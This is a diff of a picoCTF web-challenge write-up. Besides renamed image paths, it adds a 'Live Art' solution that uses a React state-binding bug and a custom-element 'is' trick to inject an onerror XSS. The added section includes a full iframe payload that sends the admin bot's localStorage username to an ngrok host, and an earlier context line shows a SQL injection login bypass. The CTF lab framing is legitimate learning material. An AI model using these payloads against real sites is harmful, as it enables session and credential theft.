@@ -240,7 +240,7 @@ A simple `SELECT * FROM flags;` revealed the flag.
 
 #### **Solution**
 
-The site opens a login page. I tested with credentials a:a again. It revealed this page:![](<../.gitbook/assets/image (24).png>)
+The site opens a login page. I tested with credentials a:a again. It revealed this page:![](<../.gitbook/assets/image (24) (1).png>)
 
 Here we can see the SQL query. This a a very easy one. We can just an `or` statement with an always true case such as `1=1` and comment out the password section with `--`
 
@@ -248,7 +248,7 @@ Username: `' OR 1=1 --`
 
 Password: a (anything)
 
-![](<../.gitbook/assets/image (27).png>)
+![](<../.gitbook/assets/image (27) (1).png>)
 
 Successfully logged in. You can find the flg in source code.\
 
@@ -279,7 +279,7 @@ This was a challenging one. A little bit.
 
 After browsing the site for few minutes, I realised that you can inject html code while creating new notes.
 
-![](<../.gitbook/assets/image (23).png>)![](<../.gitbook/assets/image (25).png>)
+![](<../.gitbook/assets/image (23).png>)![](<../.gitbook/assets/image (25) (1).png>)
 
 The source code was available to download. Let's look at what's going on in the backend. `web.js` has all the endpoints and the server is run internally on `localhost:8080`. However the most interesting part is `report.js` which handles the `/report` endpoint. Let's look at its code.
 
@@ -388,6 +388,204 @@ We'll go ahead and first get this script in one line and then enter it into the 
 
 Now we wait for 2.5 seconds :relaxed:
 
-![THE FLAG](<../.gitbook/assets/image (26).png>)
+![THE FLAG](<../.gitbook/assets/image (26) (1).png>)
 
 **Flag:** picoCTF{p00rth0s\_parl1ment\_0f\_p3p3gas\_386f0184}
+
+### Live Art <a href="#live-art" id="live-art"></a>
+
+**Description:** There's nothing quite as fun as drawing for an audience. So sign up for LiveArt today and show the world what you can do.
+
+**Points:** 500
+
+{% hint style="info" %}
+**Hint 1:** The flag will be the admin's username/broadcast link, at the origin
+{% endhint %}
+
+{% hint style="info" %}
+**Hint 2:** [The flag will be the admin's username/broadcast link, at the origin](https://html.spec.whatwg.org/multipage/custom-elements.html)
+{% endhint %}
+
+#### **Solution**
+
+This one was the trickiest of them all and I had to spend hours on it. I had to go through the source code and manually check every component for exploit (by spamming everything with console.logs ahah).&#x20;
+
+Note: I am not super familiar with react.js so I might be missing something here?
+
+Okay let's get started with what I found.
+
+Firstly, this is is sort of similar to the "noted" challenge above as this has a puppeteer bot as well and the flag is stored in the "localStorage" of the puppeteer bot.
+
+The key part of this challenge is actually finding the exploit. They payload was straight forward. On running the client source code locally I came across few interesting things. Let's go through them.
+
+#### Hooks
+
+```javascript
+const getHashParams = <T extends Record<string, string>>() => {
+  const params = new URLSearchParams(window.location.hash.substring(1));
+  const result = Object.create(null);
+
+  params.forEach((value, key) => {
+    result[key] = value;
+  });
+  
+  return result as T;
+};
+
+export const useHashParams = <T extends Record<string, string>>() => {
+  const [params, setParams] = React.useState(getHashParams<T>());
+
+  React.useEffect(() => {
+    const listener = () => {
+      console.log("Setting listner", params);
+      setParams(getHashParams<T>());
+    };
+
+    window.addEventListener("hashchange", listener);
+
+    return () => {
+      window.removeEventListener("hashchange", listener);
+    };
+  });
+
+  return params;
+};j
+```
+
+This is a little bit interesting, these functions are used in the `error.tsx` file. Basically, these are reading key value pairs from the url and are returning an object as type "Record". It is interesting because you can use this record inside html elements as attributes. For example, you can use `{height: 200, width: 200}` for type `Record<string, string>` inside any HTML element like `<div ..RecordObject ></div>` and this would translate to `<div height=200 width=200></div>`&#x20;
+
+Therefore, my first instinct was inject js code through this URL function inside an HTML element. Like `onerror=alert()` inside an image tag as the site is using image tags widely. Hence, I needed to find the right place and right payload to be able to do this. That brings us the next page.
+
+#### Drawing
+
+```javascript
+const getWrappedError = WrapComponentError(ErrorPage)
+const getWrappedViewer = WrapComponentError(Viewer);
+
+const isWideEnough = () => window.innerWidth > 600;
+
+interface Props {
+    page: string;
+}
+
+const _Drawing = (props: Props) => {
+    const [image, setImage] = React.useState<string | undefined>();
+    const [bigEnough, setBigEnough] = React.useState(isWideEnough());
+
+    const page = props.page;
+
+    React.useEffect(() => {
+        if (!page) return;
+
+        const peer = new Peer();
+        peer.on("open", () => {
+            const conn = peer.connect(page);
+            conn.on("data", (data) => {
+                if (typeof data === "string") {
+                    setImage(data);
+                }
+            });
+        })
+    }, [page]);
+
+    React.useEffect(() => {
+        const listener = () => {
+            setBigEnough(isWideEnough());
+        }
+
+        window.addEventListener("resize", listener);
+
+        return () => {
+            window.removeEventListener("resize", listener);
+        }
+    });
+
+    const view = bigEnough
+        ? getWrappedViewer({ image })
+        : getWrappedError({ error: "Please make your window bigger" });
+
+    return (
+        <div>
+            { view }
+        </div>
+    );
+};
+
+```
+
+At first this didn't seem weird but after running and observing locally I realised that the `isWideEnough()` is actually checking the size of the window that had accessed `/drawing` and is doing a conditional rendering:
+
+if the window is wide enough. It runs the `viewer` but if it not then it displays `error` page. The error page is where I found that it takes parameters from url. So definitely something is happening here.&#x20;
+
+After running and logging viewer and error pages. I realised that the viewer has a state element called `dimensions` which runs some calculations and passes it to image tag as `<img src={props.image} { ...dimensions }/>`
+
+Now things are getting interesting, if I am able to get my `Record` type object into `dimensions` then I can inject a script inside `onerror`. The question is how.&#x20;
+
+I noticed something while testing the behaviour of `/drawing` upon resizing the  the window. When I open the `/drawing` page in a smaller window it shows me error. But when I expand the window size of browser it runs the `isWideEnough()` asynchronously automatically renders the `viewer` tab. But this time the image is bugged.&#x20;
+
+![Right after increasing the browser window size](<../.gitbook/assets/image (33).png>)
+
+`<img src={props.image} { ...dimensions }/>` This is was the code it was supposed to run but here we see the both `props` and `dimensions` is empty.
+
+This is because the states of the page `/drawing` were initiated right when we loaded the url but after the page content is re-rendered dynamically the states and props inside the second rendor did not initiate. Meaning, the current state variables on this page are the ones from `error.tsx` which we loaded first due to screen being not wide enough.&#x20;
+
+Things get more interesting, we run `const [params, setParams] = React.useState(getHashParams());` in the `error.tsx` page. Now this will bind itself to the very first state variable on the second page which is `const [dimensions, updateDimensions] = ...` on `viewer`  (How? I am not 100% sure, perhaps it is by design of react or not following hooks best practices? I would appreciate if someone points me to the exact reason).
+
+This means that whatever we pass variables to `dimensions` through url by just entering the followed by `#`. Let's give it a try.&#x20;
+
+* First we open a small chrome tab and enter the url: http://`saturn.picoctf.net:63756/drawing/pwn#src=https://i.kym-cdn.com/entries/icons/facebook/000/017/788/gotem.jpg`&#x20;
+
+![](<../.gitbook/assets/image (24).png>)
+
+* Now we Maximize the window. This will show us the injected params inside the image tag.
+
+![GOTEM](<../.gitbook/assets/image (27).png>)
+
+Ok now we've established that we can inject parameters inside the image tag on `/drawing` page! Now we need to insert the `onerror` parameter. But it's not that simple. It gets filtered out by React because if it's design. We have a way around it. That is, from our second hint, Custom Elements. We can force react to treat the `<img>` tag as a custom element by passing a `is` parameter to it. ([Check this out](https://github.com/facebook/react/blob/ebd7ff65b6fea73313c210709c88224910e86339/packages/react-dom/src/shared/isCustomComponent.js#L10-L13))&#x20;
+
+Now let's try that, we repeat same steps as above with payload URL. Our URL now will be
+
+```
+http://saturn.picoctf.net:63756/drawing/pwn#src=none&onerror=alert(%22pwn%22)&is
+```
+
+![XSS](<../.gitbook/assets/image (30).png>)
+
+That worked like a charm. Now from here it's a simple way forward. Like I said in the beginning, there is puppeteer bot that opens URLs from `/fan-mail` the bot browser has the flag in its local storage. The plan is to repeat the same steps above inside the bot but capture the `localStorage.username` and send it to our ngrok. Since we can't make the bot resize the browser we will use `iframes`. Now the bot only allows http and https protocols. So we have to set up our payload on public url using ngrok and pass it to the bot. But first, let's create the payload.
+
+We need the bot to do only three things.
+
+* Load the `localhost:4000` on a low-width iframe and go to `/drawing/<anything>#src=none&onerror=<xss payload>&is`
+* Increase the width of the `iframe` after loading so we trigger the xss.&#x20;
+* Build an xss payload that can send `localStorage.username` to ngrok.
+
+Here's the payload that I cam up with:
+
+```javascript
+<iframe src="none" id=frame height="1000"></iframe>
+<script>
+	frame.contentWindow.name = `window.open('${location.href}'+localStorage.username)`
+	frame.onload = () => {
+		setTimeout(`frame.contentWindow.location = 'http://localhost:4000/drawing/pwn#onerror=eval(window.name)&src=pwn&is=notpwn'`, 1000)
+		setTimeout(`frame.width = 1000`, 1500)
+	}
+</script>
+```
+
+* Firstly, I am creating an `iframe` with `none` as source, 1000 height and default width (which is small enough to produce the error).
+* Second I am storing a function that will capture the `localStorage.username` and send it to ngrok in a string format. I am using `frame.contentWindow.name` to store it since we can't store it outside the iframe context.&#x20;
+  * Note, the current state of the `frame.contentWindow.name` is stored in string format. So it doesn't execute the function inside it unless we run it inside `eval()`
+  * `location.href` is basically the URL of the ngrok.
+* After that, I am changing the iframe src to the xss URL. Which opens the error page.
+  * Note, the xss runs `eval(window.name)` which basically executes the (string) name: `window.open('${location.href}'+localStorage.username)` as javascript code. So this will open `<our ngrok url>/<flag>`
+* Lastly, I am changing the width of the iframe to large enough to trigger the XSS.
+
+Now let's save this payload as `index.html` and start our simple http server in python using `python3 -m http.server` and then start our ngrok server that listens to the simple http server on our computer.&#x20;
+
+![The Setup](<../.gitbook/assets/image (26).png>)
+
+Now we just enter our ngrok URL in the fan-mail section and we should see our flag in logs.
+
+![The FLAG](<../.gitbook/assets/image (28).png>)
+
+**Flag:**picoCTF{beam\_me\_up\_reacty\_90b651ae}
